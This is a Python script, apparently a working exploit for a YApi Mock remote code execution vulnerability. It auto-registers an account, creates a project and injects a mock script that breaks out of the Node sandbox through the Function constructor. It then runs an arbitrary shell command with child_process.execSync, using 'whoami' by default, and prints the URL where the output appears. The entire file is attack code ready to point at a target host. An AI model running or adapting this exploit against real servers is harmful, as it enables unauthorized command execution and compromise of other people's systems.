#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests, sys, random, json

class Scan():
    def __init__(self, host):
        self.headers = {
            'Content-Type' : 'application/json'
        }
        self.host = host

    def reg_email(self):
        url = self.host + '/api/user/reg'
        num = random.randint(0,9999)
        data = {"email":"{}test@test.com".format(num), "password":"123456", "username":"{}test@test.com".format(num)}
        r = requests.post(url=url, headers=self.headers, json=data)
        res = r.json()
        if res['errcode'] == 401 or res['errcode'] == 0:
            print('[+] 注册成功!邮箱账户/密码：({}test@test.com/123456)'.format(num))
        else:
            print('[-] 邮箱自动注册失败！请手动注册。')
        return r.cookies.get_dict()

    def add_project(self,cookies, id):
        url = self.host + '/api/project/add'
        data = {"name":"rce","basepath":"/rce","desc":"rce","group_id":id,"icon":"code-o","color":"yellow","project_type":"private"}
        r = requests.post(url=url, headers=self.headers, cookies=cookies, json=data)
        _id = r.json()['data']['_id']
        print('[+] 项目创建成功！')
        return _id

    def write_mock(self, cookies, id, cmd):
        url = self.host + '/api/project/up'
        data = {
            "id":id,
            "project_mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"{}\").toString()".format(cmd),
            "is_mock_open":True
        }
        r = requests.post(url=url, headers=self.headers, cookies=cookies, data=json.dumps(data))
        if r.json()['errcode'] == 0:
            print('[+] 配置mock成功！')
        else:
            print('[-] mock配置失败！')
            print('[-] 错误响应：', r.json())

    def get_id(self, cookies):
        url = self.host + '/api/group/list'
        r = requests.get(url=url, cookies=cookies)
        id = r.json()['data'][0]['_id']
        return id

    def add_interface(self,cookies,_id):
        url = self.host + '/api/project/get?id={}'.format(_id)
        r = requests.get(url=url, cookies=cookies)
        catid = r.json()['data']['cat'][0]['_id']
        url = self.host + '/api/interface/add'
        data = {"method":"GET","catid":str(catid),"title":"rce","path":"/rce","project_id":_id}
        r = requests.post(url=url, cookies=cookies, headers=self.headers, data=json.dumps(data))
        if r.json()['errcode'] == 0:
            print('[+] 接口添加成功！')
        else:
            print('[-] 接口添加失败！')

    def poc(self, cmd):
        print('[+] 正在检测YApi Mock远程代码执行漏洞...')
        try:
            cookies = self.reg_email()
            id = self.get_id(cookies)
            _id = self.add_project(cookies, id)
            self.write_mock(cookies, _id, cmd)
            self.add_interface(cookies,_id)
            url = self.host + '/mock/{}/rce/rce'.format(_id)
            print('[+] 命令执行 whoami 回显地址：{}'.format(url))
        except:
            print('[-] 可能不存在Yapi Mock远程代码执行漏洞')

    def exp(self):
        pass

def run(host, cmd):
    host = host.rstrip('/')
    s = Scan(host)
    s.poc(cmd)


if __name__ == '__main__':
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 yapi-rce.py ",target)
    run(target, "whoami")
